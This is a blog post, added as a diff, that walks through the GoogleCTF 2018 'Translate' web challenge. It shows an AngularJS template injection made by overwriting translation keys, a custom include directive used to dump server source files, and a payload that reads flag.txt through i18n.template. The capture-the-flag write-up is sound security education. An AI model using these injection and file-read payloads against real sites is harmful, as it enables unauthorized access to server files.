@@ -1,0 +1,215 @@
+---
+title: "GoogleCTF 2018: Translate WriteUp"
+description: "WriteUP for the GoogleCTF 2018 challenge Translate"
+publishDate: 2018-06-25
+updatedDate: 2018-06-26
+tags:
+  - writeup
+  - angular
+  - javascript
+draft: false
+---
+
+# Introduction
+
+Once again, Google hosted a Capture the flag competition this year.
+The objective is to find vulnerabilities in various applications to find a `flag` and gain points.
+
+You can check out the website here: [Website](https://capturetheflag.withgoogle.com)  
+The challenges should remain online until they break, as they are not monitored anymore.
+
+This post will cover the solution of the web **Translate** challenge.
+
+# Challenge: Translate
+
+![challenge](/images/blog/challenge-1.png)
+
+The Attachment contained a link to the challenge itself: [http://translate.ctfcompetition.com:1337](http://translate.ctfcompetition.com:1337)
+
+## Information gathering
+
+This is a web application which helps us translating words between French and English.  
+Here are few screenshots of the application in action:
+
+**Index**  
+![Challenge index](/images/blog/translate_index-1.png)
+
+**Adding a translation**  
+![Add translation](/images/blog/add_translation-1.png)  
+![Add translation result](/images/blog/add_translation_result-1.png)
+
+**Viewing a translation**  
+![View translation](/images/blog/view_translation-1.png)
+
+**Dump**  
+![Debug translation](/images/blog/debug_translations-1.png)
+
+## Solving the challenge
+
+### 1. Entry point
+
+We can notice it is an AngularJS application when viewing the source:  
+![Source: Html containg ng-app attributes](/images/blog/source_angular-1.png)  
+But oddly enough, there is no JavaScript on the page, as this application is server-side rendered.
+
+The first thing we need to do is to find an XSS and inject our own code in this page.
+My first attempt was to add a word which contained either HTML or an angular template content:
+
+<img
+  src="https://gitlab.com/AntonyGarand/blogposts/raw/master/assets/translate_xss_test.png"
+  alt="Translating test&lt;img&gt;{{2+2}}"
+/>
+But this didn't work out, as it was sanitized.
+
+The key to this injection is in the debug page, which contains the following JSON:
+
+```json
+{
+  "lang": "fr",
+  "translate": "Traduire",
+  "not_found": "Je ne connais pas ce mot, désolé.",
+  "in_lang_query_is_spelled": "En francais,\n<b>{{{{userQuery}}}}</b> s'écrit\n <b ng-bind=\"i18n.word(userQuery)\"></b>.",
+  // ...
+  "original_word": "Mot à traduire",
+  "test<img>{{{{2+2}}}}": "test<img>{{{{2+2}}}}"
+}
+```
+
+The injected words are at the root of the object, next to the application's original keys.  
+Unlike our injected words, the expressions inside the original keys are rendered and evaluated correctly.
+This can be tested by overwriting the `translate` key:  
+![Overwriting the translate keyword](/images/blog/translate_xss_poc_1-1.png)  
+![Source of the overwrited keyword](/images/blog/translate_xss_poc_2-1.png)
+
+As we can overwrite the original JSON keys with our new unsanitized values, we can keep going!  
+Note: I now noticed that we could also overwrite the `in_lang_query_is_spelled` key to change how our word is rendered, but in the ends the solution remains the same.
+
+Also note that while this entry point is common to everyone, many teams found alternate solutions from here.  
+I will write about my experience and what I believe is the shortest path to the flag, but will link other interesting techniques and writeups in the ressource section.
+
+### 2. Dumping the source
+
+When viewing the footer source, we can see a custom `my-include="static/footer.html"` attribute.  
+![Source: Footer source containing my-include attribute](/images/blog/footer_source-1.png)
+
+What happens if we try to create our own div with `my-include="flag.txt"`?  
+Well, it's not that easy!  
+Here is the index page when translating `translate` to `<div my-include="flag.txt"></div>`:  
+![Error: Broken angular app](/images/blog/flag_error_include-1.png)  
+The my-include directive only lets us read `js`, `json` or `html` files, while the `flag.txt` files isn't in those format.
+
+As we can read js files, let's try to check the application source instead!  
+My first tries here were to find the application index, such as `index.js`, `app.js`, but that did not work out.  
+A common file most NodeJS application has is the `package.json`, to list depencies and manage the application entrypoint:
+
+```html
+<div my-include="package.json">
+  { "name" : "ctfssr", "version": "0.0.1", "main": "./srcs/index.js",
+  "dependencies": { "domino": "=2.0.2", "express": "=4.16.3", "vm2": "=3.6.0",
+  "memcached-promisify": "latest", "uuid": "latest", "cookie-parser": "latest" }
+  }
+</div>
+```
+
+`srcs/index.js` should therefore be the entrypoint of the application, as described in the `main` key of the `package.json` file.  
+Well, it turns out this isn't the case:
+
+```html
+<div my-include="srcs/index.js">
+  Couldn't load template: Error: ENOENT: no such file or directory, open
+  './srcs/index.js'
+</div>
+```
+
+After searching for the entrypoint for a while, [@molnar_g](https://twitter.com/molnar_g) ended up giving me the solution once the CTF was over: `srcs/server.js`  
+I'll keep a note to add `server.js` to my entrypoint fuzzing list!  
+With this information, we can dump the source of the server!  
+The main parts will be highlighted in this post but if you want the full source, it should be added to the GoogleCTF github project: https://github.com/google/google-ctf  
+Or you can dump it from the website itself while it is still running.
+
+The interesting part of the source is how the SSR is done, in the renderWithAngular function:
+
+```javascript
+function renderWithAngular(givenScope, lang, fs, ip) {
+  try {
+    // Remember the AngularJS sandbox? Only 2010's kids remember.
+    const sandbox = new NodeVM ({
+      require: {
+        // ...
+        import: [
+          `./srcs/sandboxed/angularjs_for_domino.js`,
+          `./srcs/sandboxed/app.js`,
+          `domino`
+        ],
+    // ...
+    let renderAngularApp = sandbox.run(`
+      const domino = require('domino');
+      const initAngularJS = require('./srcs/sandboxed/angularjs_for_domino.js');
+      const angularApp = require('./srcs/sandboxed/app.js');
+
+      module.exports = async (givenScope, lang, fs, ds) => {
+          // ...
+          initAngularJS(window);
+          try {
+            await angularApp(window, givenScope, i18n, lang);
+            return window.document.innerHTML;
+          } catch (error) {
+            return 'You broke my AngularJS :( ' + error + '
+          }
+    `, 'server.js');
+```
+
+This lets us find more content to extract, specifically the `./srcs/sandboxed/app.js` application!
+The app.js file contains the `paramsController` and the `myInclude` directive:
+
+```javascript
+// App functionnality
+app.controller("paramsController", function ($window, $scope, i18n) {
+  $scope.window = $window;
+  $scope.i18n = i18n;
+  for (const k of Object.keys(givenScope)) {
+    $scope[k] = givenScope[k];
+  }
+});
+```
+
+```javascript
+// A directive to load internationalized templates.
+app.directive("myInclude", ($compile, $sce, i18n) => {
+  var recursionCount = 0;
+  return {
+    restrict: "A",
+    link: (scope, element, attrs) => {
+      if (!attrs["myInclude"].match(/\.html$|\.js$|\.json$/)) {
+        throw new Error(
+          `Include should only include html, json or js files ಠ_ಠ`,
+        );
+      }
+      // ...
+      element.html(i18n.template(attrs["myInclude"]));
+      $compile(element.contents())(scope);
+    },
+  };
+});
+```
+
+The interesting parts in the previous code are the `$scope` assignation in the `paramsController` and the `i18n.template` usage in the `myInclude` directive.  
+In order to load an external file, the myInclude directive uses `i18n.template`, from the i18n service.  
+I didn't add the `i18n.js` source here, but its behavior is similar to `fs.readFileSync`, with a bit of extra parsing done.
+
+As the `paramsController` added the `i18n` variable to the application's `$scope`, this means we can use it in our HTML!
+
+### 3. Extracting the flag
+
+Adding the translation for `translate` with a value of `FLAG::{{{{i18n.template('flag.txt')}}}}::ENDFLAG` should extract the flag:  
+![Printed flag](/images/blog/flag-1.png)
+
+# References
+
+[Google CTF 2018](https://capturetheflag.withgoogle.com/)  
+[The Challenge itself](http://translate.ctfcompetition.com:1337)
+
+[Alternative writeUp](https://auxy233.github.io/Google-CTF-web-partial/#translate)
+This team did not dump the source code but instead messed around with the variables of the current scope.  
+This ended up giving them the `i18n` variable with its `template` method, which works out in the end!  
+[monlar_g's tweet](https://twitter.com/molnar_g/status/1011102786367512579) giving me the `server.js` path
